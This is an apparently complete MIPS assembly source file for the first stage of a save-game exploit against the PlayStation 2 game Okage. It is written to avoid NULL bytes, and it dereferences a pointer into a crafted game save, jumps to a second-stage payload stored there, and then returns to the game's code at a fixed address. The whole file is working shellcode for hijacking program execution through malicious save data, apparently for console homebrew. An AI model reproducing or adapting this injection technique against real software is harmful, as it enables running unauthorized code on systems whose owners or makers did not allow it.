.set noat
.set noreorder
.section .text

# Stage 1
# * Dereferences game save pointer
# * Jumps to stage 2 inside game save
# * Continues Okage code execution by jumping back to 0x11DEDC
# * Must not contain any NULL bytes (except after the final jump)

.global _start
_start:
    # t0 = 0x02020202 (avoiding null byte)
    lui   $t0, 0x202
    ori   $t0, $t0, 0x202

    # Dereference GameSave Pointer (0x02020202-0x01DD13FE = 0x0024EE04)
    lw $t1, -0x01DD13FE ($t0)

    # Increment GameSave offset
    addi $t1, $t1, 0xA28

    # Jump to $t1 (Stage 2)
    jal $t1
    move $sp, $sp             # (Non-NULL NOP)

    # Jump back to original $ra (continue execution)
    li $ra, 0x111EF8C
    li $at, -0x10010B0
    add $ra, $ra, $at         # $ra = 0x11DEDC
    j 0x11DEDC
    nop